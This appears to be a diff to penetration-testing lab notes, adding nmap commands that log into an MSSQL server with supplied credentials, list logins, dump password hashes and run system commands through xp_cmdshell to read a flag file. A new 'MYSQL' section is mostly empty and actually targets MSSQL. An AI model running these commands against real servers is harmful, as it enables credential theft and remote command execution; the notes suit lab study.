@@ -599,15 +599,46 @@ nmap [ip] -p 1433 --script ms-sql-empty-password
 
 9.  Execute MSSQL query to extract sysusers
 ```
-nmap [ip] -p 1433 --script ms-sql-empty-password
+nmap [ip] -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="select * from master..syslogins" -oN output.txt
 ```
 
 11.  Dump MSSQL users hashes
 ```
-
+nmap [ip] -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 
 ```
 
 13.  Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)
+```
+nmap [ip] -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
+
+nmap [ip] -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
+```
+---
+# Recon: MYSQL: Metasploit
+
+-   Discover valid users and their passwords
+```
+nmap [ip]
+
+nmap [ip] -p 1433 -sV
+```
+
+-   Enumerate MSSQL configuration
+```
+
+```
+
+-   Enumerate all MSSQL logins
+```
+
+```
+
+-   Execute a command on the target machine
+```
+
+```
+
+-   Enumerate all available system users
 ```
 
 ```
